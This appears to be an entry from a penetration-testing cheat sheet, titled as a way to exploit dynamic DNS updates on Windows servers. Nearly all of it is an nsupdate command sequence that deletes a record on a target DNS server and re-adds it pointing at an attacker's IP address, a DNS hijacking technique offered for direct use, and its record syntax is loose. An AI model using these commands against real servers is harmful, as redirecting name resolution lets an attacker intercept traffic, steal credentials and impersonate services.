# DNS

### Exploit dynamic DNS updates on windows servers

```text
nsupdate
> server <target ip>
> update delete <replaced entry>
> send
> update add <replaced entry> <port> <attacker ip>
> send
> quit
```

